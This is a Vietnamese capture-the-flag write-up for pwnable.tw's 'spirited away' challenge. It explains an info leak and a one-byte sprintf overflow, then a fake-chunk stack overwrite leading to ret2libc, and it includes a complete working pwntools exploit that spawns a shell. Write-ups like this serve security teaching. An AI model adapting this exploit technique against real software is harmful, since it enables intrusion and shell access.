# spirited away (pwnable.tw)

# challenge này thực sự khá hay nhưng mà phải tính toán hơi nhiều

## RE 
Sau khi RE và soi code của challenge này thì ko có gì nhiều, chương trình đọc vào một số chuỗi và biến, đồng thời cũng check length input khá chắc chắn nên sẽ không có lỗi BOF

Debug một hồi thì mk phát hiện ra lỗi ở hai dòng này

![RE1.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624266371479/qLlwucODm.png)
* Do chuỗi s không có kí tự kết thúc chuỗi, nên khi put(s) chương trình sẽ in stack đến khi gặp byte \x00  
=> leak được 3 địa chỉ gồm : ebp, ret_address, và địa chỉ của lib  
=> tính được địa chỉ của stack , system, bin_sh  

![RE2.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624266357593/UYhXVpJSs.png)

Lỗi số 2 đó chính là nằm ở hàm sprintf, ta thấy biến s là một mảng gồm 56 kí tự, chuỗi format truyền vào đã gồm 56 kí tự bao gồm cả biến counter
* Nếu biến counter là số  có 3 chữ số thì chuỗi s sẽ gồm 57 kí tự, tràn một kí tự 'n' xuống phần lưu giá trị của biến name_size  
=> name_size = 0x3c sẽ bị ghi đè thành name_size = 0x6e  
![RE3.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624266381228/algB98vHp.png)
* mặt khác, biến comment cũng đọc vào name_size kí tự => khi nhập 0x6e kí tự thì sẽ overwrite được giá trị của age, địa chỉ trên heap của name ở trên stack và ở cuối chương trình sẽ free(name_address), malloc(name_address) => tận dụng để tạo fake chunk 
## content to exploit
* leak : libc base, stack_address => tính system address và địa chỉ của 'why did you came to see this movie?'(movie_name) ở trên stack  
* lặp lại nhiều lần tăng biến counter > 100
* tạo một fake chunk cho biến name ở trên stack, fake chunk này được tạo bằng input của movie_name
* nhập input cho comment, overwrite địa chỉ của biến name bằng địa chỉ của movie_name (địa chỉ của fake chunk)
* sau khi chương trình free(movie_name), malloc(movie_name) thì lúc này, biến name thay vì được lưu trên heap thì h được lưu trên stack với địa chỉ của movie_name
* Độ dài của name là 0x6e => overwrite retaddr
* control EIP bằng ROP => get shell  

```python
from pwn import *

# conn = process('./spirited_away_patched')
conn = remote('chall.pwnable.tw', 10204)
libc = ELF('./libc_32.so.6')

libc_offset = 0x1b0d60
# def main_func(name):
    

# main_func('a'*20)
conn.recvuntil('name: ')
conn.sendline('a'*20)
conn.recvuntil('age: ')
conn.sendline('18')
conn.recvuntil('movie? ')
conn.sendline('c'*79)
conn.recvuntil('comment: ')
conn.sendline('a'*59)

print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())

recv = conn.recvline()
stack_leak = int.from_bytes(recv[:4], byteorder='little') - 0x60
libc_base = int.from_bytes(recv[8:12], byteorder='little') - libc_offset
bin_sh_addr = libc_base + 0x158e8b
log.info('stack address: %#x'% stack_leak)
log.info('libc base address: %#x' % libc_base)
log.info('/bin/sh address %#x' % bin_sh_addr)
conn.recvuntil('<y/n>:')
conn.sendline('y')

for i in range(9):
    conn.sendafter('Please enter your name: ', 'a\0')
    conn.sendafter('Please enter your age: ', '1\n')
    conn.sendafter('Why did you came to see this movie? ', 'c\0')
    conn.sendafter('Please enter your comment: ', 'd\0')
    conn.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

for i in range(90):
    conn.sendafter('Please enter your age: ', '1\n')
    conn.sendafter('Why did you came to see this movie? ', 'c\0')
    conn.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

conn.recvuntil('name: ')
conn.sendline('a\0')
conn.recvuntil('age: ')
conn.sendline('1\n')
conn.recvuntil('movie? ')
# input('?')
conn.send(b'a'*8 + p32(0) + p32(0x41) + b'a'*56 + p32(0) + p32(0x11)) # create fake chunk
conn.recvuntil('comment: ')
# input('?')
conn.send(b'b'*80 + p32(0x1) + p32(stack_leak)) #over write name_address with comment address
conn.recvuntil('n>: ')
conn.sendline('y')

conn.recvuntil('name: ')
conn.sendline(b'a'*68 + p32(libc_base + libc.symbols['system']) + p32(libc_base + libc.symbols['exit']) + p32(bin_sh_addr))
conn.recvuntil('age: ')
conn.sendline('1\n')

conn.recvuntil('movie? ')
conn.sendline('n')
conn.recvuntil('comment: ')
conn.sendline('aaa')
conn.recvuntil('n>: ')
conn.sendline('n')
conn.interactive()
```
**Thanks you for reading**